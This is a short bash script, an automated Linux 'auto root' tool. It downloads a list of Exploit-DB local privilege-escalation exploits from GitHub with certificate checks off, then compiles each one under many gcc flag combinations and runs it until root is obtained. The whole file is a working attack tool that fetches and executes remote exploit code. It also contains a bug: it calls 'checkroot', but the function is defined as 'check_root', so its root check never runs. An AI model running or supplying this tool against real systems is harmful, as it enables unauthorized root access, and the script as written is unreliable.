#!/bin/bash
# Author Dario Clavijo 2017
# All exploits come from "exploitdb" and will update according to it.
# usage: bash root.sh

#set -x

check_root() {
	if [ $(id -u) == 0 ]; then
		echo "[+] Got R00T.. have fun :)"
		echo "[+] ID: $(id -u) WHOAMI: $(whoami)"
		exit
	else
		echo "[*] Still R00Ting.. wait"
		sleep 1
	fi
}

CC(){
	OPTS=$1
	gcc $OPTS -o exploit exploit.c >> /dev/null
	if [ $? == 0 ]; then
		./exploit
	fi
}

execute_exploit(){
	#CC ""
	echo "[+] Compiling..."
	CC "-w -lutil -lpthread"
	CC "-w -m32 -O2 -o exploit"
	CC "-w -O2 -o exploit"
	CC "-w -lkeyutils -w"
	CC "-w -lpthread"
	CC "-w -pthread"
	CC "-w -static"
	CC "-w -fPIC -shared -ldl"
	CC "-w -O2"
	CC "-w -O2 -fomit-frame-pointer"
	CC "-w -static -O2"
	CC "-w -pthread -lcrypt"
	CC "-w -m64"
}

download_list(){
	echo "[+] Downloading list"
	wget --no-check-certificate $1 -O c_exploitlist.txt 
}
download_exploit(){
	echo "[+] Downloading exploit $1"
	wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/$1 -O exploit.c -q
}

clean_up(){
	rm exploit.c
	rm exploit
	rm c_exploitlist.txt
}

main(){
	echo "[*] Auto Root Tool by Daedalus"
	download_list https://raw.githubusercontent.com/daedalus/AutoRootTool/master/c_exploitlist.txt
	for line in `sort -u -n c_exploitlist.txt`
	do
		download_exploit $line; 
		execute_exploit
		checkroot
	done
	clean_up
	echo "[!] Im sorry i could'nt get root..."
}

main
